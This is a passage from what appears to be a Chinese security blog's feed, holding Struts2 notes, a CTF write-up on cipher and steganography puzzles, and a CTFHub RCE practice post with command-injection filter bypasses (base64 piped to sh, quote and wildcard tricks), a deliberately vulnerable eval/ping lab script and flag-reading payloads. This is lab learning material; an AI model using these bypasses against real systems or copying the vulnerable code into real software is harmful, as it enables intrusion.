src="https://img-blog.csdnimg.cn/20210319201255433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Struts2处理流程"><a href="#Struts2处理流程" class="headerlink" title="Struts2处理流程"></a>Struts2处理流程</h2><p>（1）用户在客户端发出HTTP请求</p><p>（2）然后请求被核心过滤器StrutsPrepareAndExecuteFilter拦截</p><p>（3）核心过滤器将请求转发到Action映射器，Action映射器负责识别当前的请求是否需要交由Struts2处理。</p><p>（4）Action映射器返回需要struts2处理的信息，StrutsPrepareAndExecuteFilter会创建一个Action代理</p><p>（5）Action代理并不知道执行哪一个Action，它会向配置管理器询问调用哪一个Action，配置管理器会从struts.xml读取我们配置的Action信息。</p><p>（6）Action代理创建相关请求的Action对象，调用相关的方法之前，struts2的一系列拦截器会帮我们做一些操作，例如获取请求参数等。</p><p>（7）然后调用execute方法根据返回的字符串去匹配相应的页面，</p><p>（8）页面可以获取一些页面模板，然后生成最终页面，再倒序的执行拦截器的后续操作</p><p>（9）最后生成HTTP响应内容</p><p><img src="https://img-blog.csdnimg.cn/20210319201448283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（一）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="http://atkx.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>春秋杯新年欢乐赛</title>
    <link href="http://atkx.top/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
    <id>http://atkx.top/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</id>
    <published>2021-02-09T14:25:13.000Z</published>
    <updated>2021-05-06T10:32:11.713Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：记春秋杯新年欢乐赛两道题目复现</p> <a id="more"></a><h2 id="十二宫的挑衅"><a href="#十二宫的挑衅" class="headerlink" title="十二宫的挑衅"></a>十二宫的挑衅</h2><p>下载附件，解压，得到Twelve_palaces_of_serial_killers.png图片<br><img src="https://img-blog.csdnimg.cn/2021020118270295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>提取图片内容为，将密文放在excel表格中,第一个字符^，随后再向下移动一格，在向左移动两个，得到第二个字符&gt;，以此类推。<br><img src="https://img-blog.csdnimg.cn/2021020118272653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过重新排列，得到新的密文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">^&gt;%..@3*&amp;<span class="hljs-comment">#(#0+@#+</span><br>.@*53)8@+@$+&amp;!%&gt;^<br>&amp;.@36%&amp;&amp;4@?<span class="hljs-comment">#&lt;!=.*</span><br>9@=(<span class="hljs-comment">#=@79@&lt;~)8%=^</span><br>=0.*/611811)*&gt;@<span class="hljs-comment">#0</span><br>0%8$+@-<span class="hljs-variable">$1</span>?*53!?7-<br>+(^(*==$<span class="hljs-variable">$5</span>*=+<span class="hljs-comment">#==^</span><br>4&amp;~<span class="hljs-variable">$7</span>%6%.&amp;?<span class="hljs-comment">#5)%51</span><br>!)<span class="hljs-comment">#?$&lt;&lt;^()8!?7%&lt;@</span><br></code></pre></td></tr></table></figure><p>在AZdecrypt软件运行后，得到一段英文<br><img src="https://img-blog.csdnimg.cn/20210201185433621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>猜测flag为flag{WUUHUU TAKE OFF}，提交后发现不对。经过尝试后，发现去掉空格提交成功。最终</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;WUUHUUTAKEOFF&#125;<br></code></pre></td></tr></table></figure><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>题目描述：对nCov了解多少？</p><p>一个题目附件和一个hint附件，hint内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE======<br></code></pre></td></tr></table></figure><p>Base32解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html<br>https://www.ncbi.nlm.nih.gov/orffinder/<br>http://www.merrybio.com.cn/blog/coronavirus-introduction.html<br><br>Please notice The largest structural protein<br>the password is the md5(it<span class="hljs-string">&#x27;s gene sequence) and do not let the ‘\n’ in md5()</span><br></code></pre></td></tr></table></figure><p>三个网址，两篇介绍病毒的文章和一个基因查询网站。后面的英文句子意思是请注意最大的结构蛋白，password是md5（它的基因序列）。</p><p>在文章中搜索关键字<code>最大的结构蛋白</code>，是刺突蛋白。<br><img src="https://img-blog.csdnimg.cn/20210201162644442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>hint中所给的<a href="https://www.ncbi.nlm.nih.gov/orffinder/">查询</a>网站，要求以FASTA格式输入登录号、gi或核苷酸序列。在文本区域中输入查询序列<br><img src="https://img-blog.csdnimg.cn/20210201165625242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>文章中查找登录号<code>MN908947</code><br><img src="https://img-blog.csdnimg.cn/20210201163419968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在文章中找到范围为<code>21536-25384</code><br><img src="https://img-blog.csdnimg.cn/20210201163827698.png" alt="在这里插入图片描述"><br>输入登陆号和范围，得到基因序列<br><img src="https://img-blog.csdnimg.cn/20210201165858431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制基因序列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT<br></code></pre></td></tr></table></figure><p>md5后的值为password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">98eb1b1760bcc837934c8695a1cee923<br></code></pre></td></tr></table></figure><p>使用MP3Stegog工具</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P <span class="hljs-number">98</span>eb1b1760bcc837934c8695a1cee923 cov.mp3<br></code></pre></td></tr></table></figure><p>得到压缩包解压密码<br><img src="https://img-blog.csdnimg.cn/20210201172036562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包，有一个hint2文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154<br></code></pre></td></tr></table></figure><p>base16解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">you must pay attention to N protein ,How <span class="hljs-keyword">do</span> that get into the viral capsid?<br><span class="hljs-keyword">do</span> you know steghide?<br>the password is encrypt by Vigenère Cipher<br>the screct key is The top <span class="hljs-number">20</span> characters with the most occurrences are counted+COMBAT<br></code></pre></td></tr></table></figure><p>hint2提示，注意N蛋白的进入方式，steghide是图片隐写工具，password经过Vigenère加密，然后Vigenère需要的key是出现次数最多的前20个字符+<code>COMBAT</code></p><p>N蛋白结合M蛋白和E蛋白，进入病毒衣壳内<br><img src="https://img-blog.csdnimg.cn/20210201173231449.png" alt="在这里插入图片描述"><br>NME三个基因范围为分别为28274-29533、27202-27387、26523-27191<br><img src="https://img-blog.csdnimg.cn/20210201173601783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>三个蛋白的基因序列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">N基因<br>MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA<br>SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK<br>MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN<br>PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG<br>SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS<br>AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH<br>WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV<br>ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL<br>DDFSKQLQQSMSSADSTQA<br>M基因<br>MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS<br>QLDEEQPMEID<br>E基因<br>MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK<br>LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF<br>RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR<br>IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR<br>IGNYKLNTDHSSSSDNIALLVQ<br></code></pre></td></tr></table></figure><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">在线字频分析</a>，统计前20个频率最高的字符。<br><img src="https://img-blog.csdnimg.cn/20210201174426117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有些字符的频次相同，可以调换顺序，再结尾加上hint2里面给的COMBAT，最终维吉尼亚密码的key为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">LGASTRIQKNDPFEVYMWHCCOMBAT<br></code></pre></td></tr></table></figure><p>上面提到的password在附件pass.wav中，<a href="https://sourceforge.net/projects/silenteye/">SilentEye</a>工具进行解密，得到密文<code>priebeijoarkjpxmdkucxwdus</code>。<img src="https://img-blog.csdnimg.cn/20210201175709390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>维吉尼亚解密，得到<code>eliminatenovelcoronavirts</code><br><img src="https://img-blog.csdnimg.cn/20210201175947417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用steghide提取CoV-1.jpg隐藏文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf CoV-1.jpg -p eliminatenovelcoronavirts<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201181921964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：记春秋杯新年欢乐赛两道题目复现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-RCE练习</title>
    <link href="http://atkx.top/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
    <id>http://atkx.top/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</id>
    <published>2021-01-16T08:12:47.000Z</published>
    <updated>2021-05-04T15:05:15.371Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（四）</p> <a id="more"></a><h1 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h1><p>RCE英文全称：remote command/code execute<br>分为远程命令执行和远程代码执行<br>| 分类         | 说明                       | 函数 |<br>| ———— | ————————– | —- |<br>| 远程命令执行 | 直接调用操作系统命令       | ping |<br>| 远程代码执行 | 靠执行代码调用操作系统命令 | eval |</p><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h2 id="Windows管道符"><a href="#Windows管道符" class="headerlink" title="Windows管道符"></a>Windows管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h2 id="Linux的管道符"><a href="#Linux的管道符" class="headerlink" title="Linux的管道符"></a>Linux的管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td><code>;</code></td><td>执行完前面的语句再执行后面的语句。</td></tr><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>　1.拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=c;b=at;c=fl;d=ag;$a<span class="hljs-variable">$b</span> $c<span class="hljs-variable">$d</span><br>?c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;sys&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;tem&#x27;</span>;<span class="hljs-variable">$d</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$d</span>(<span class="hljs-string">&#x27;cat config.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>　2.编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash<br></code></pre></td></tr></table></figure><p>　3.单引号，双引号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t flag<br>ca<span class="hljs-string">&quot;&quot;</span>t flag<br></code></pre></td></tr></table></figure><p>　4.反斜杠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c\at fl\ag<br></code></pre></td></tr></table></figure><p>   5.Shell 特殊变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-variable">$@t</span> flag<br>ca<span class="hljs-variable">$1t</span> flag<br></code></pre></td></tr></table></figure><p>   6.通配符绕过</p><p>常用的通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">* <span class="hljs-comment">#匹配任意长度字符</span><br>? <span class="hljs-comment">#匹配任意单个字符</span><br>[list] <span class="hljs-comment">#匹配指定范围(list)内的任意字符，也可以是单个字符组成的集合</span><br>[^list] <span class="hljs-comment">#匹配指定范围外的任意单个字符或字符集合</span><br>[!list]  <span class="hljs-comment">#[^list]</span><br>&#123;str1,str2&#125;<span class="hljs-comment">#匹配str1或者str2</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br>cat fl[a-z]?<br>cat fla* <br>cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br></code></pre></td></tr></table></figure><h1 id="相关命令执行变量"><a href="#相关命令执行变量" class="headerlink" title="相关命令执行变量"></a>相关命令执行变量</h1><p>PHP代码执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span>函数、<br>preg_replace、<br>create_function函数、<br>array_map、<br>call_user_func、<br>assert、<br>call_user_func_array、<br>array_filter、<br>uasor <br></code></pre></td></tr></table></figure><p>PHP代码命令执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">popen、<br>proc_popen、<br>passthru、<br>system变量、<br><span class="hljs-built_in">exec</span>变量、<br>shell_exec、<br>pcntl_exec。<br></code></pre></td></tr></table></figure><h1 id="CTFHub-Web-RCE练习"><a href="#CTFHub-Web-RCE练习" class="headerlink" title="CTFHub-Web-RCE练习"></a>CTFHub-Web-RCE练习</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看根目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201208153824782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看下一级目录,发现flag_23816文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls /&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020120918423712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用cat命令读取文件,找到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;cat /flag_23816&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201209184311919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//blog.csdn.net/Xxy605/article/details/107548841?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control</span><br></code></pre></td></tr></table></figure><h2 id="命令注入-无过滤"><a href="#命令注入-无过滤" class="headerlink" title="命令注入-无过滤"></a>命令注入-无过滤</h2><p>这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br><span class="hljs-variable">$res</span> = FALSE;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 &#123;<span class="hljs-variable">$_GET</span>[&#x27;ip&#x27;]&#125;&quot;</span>;<br>    <span class="hljs-built_in">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ping一下127.0.0.1<br><img 